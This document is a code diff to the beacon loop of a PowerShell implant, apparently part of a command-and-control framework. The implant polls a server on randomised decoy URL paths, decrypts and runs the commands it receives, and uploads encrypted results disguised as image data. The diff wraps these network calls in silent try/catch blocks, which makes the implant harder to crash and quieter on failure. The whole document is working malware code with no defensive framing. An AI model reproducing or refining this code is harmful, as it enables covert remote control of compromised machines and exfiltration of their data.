@@ -1692,6 +1692,7 @@ $message =[Convert]::ToBase64String($Bytes)
             Sleep = $defaultbeacon
             ModsLoaded = ""
         }
+
         $message = '
 
 $key="' + "$key"+'"
@@ -1821,7 +1822,7 @@ while($true)
     $URLS = "images/static/content/","news/?id=","webapp/static/","images/prints/","wordpress/site/","steam?p=","true/images/77/static?","holidngs/images/"
     $RandomURI = Get-Random $URLS
     $Server = "$ServerClean/$RandomURI$URI"
-    $ReadCommand = (Get-Webclient).DownloadString("$Server")
+    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
     
     while($ReadCommand) {
         $ReadCommandClear = Decrypt-String $key $ReadCommand
@@ -1868,10 +1869,12 @@ while($true)
                             } catch {
                                 $Output = "ErrorCmd: " + $error[0]
                             }
+                            try {
                             $Output = Encrypt-String2 $key $Output
                             $Response = Encrypt-String $key $i
                             $UploadBytes = getimgdata $Output
                             (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
+                            } catch{}
                         }
                     } 
             }
@@ -1913,11 +1916,11 @@ while($true)
                 } catch {
                     $Output = "ErrorCmd: " + $error[0]
                 }
-
+            try {
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
             (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
-
+            } catch {}
             }
         }
     break
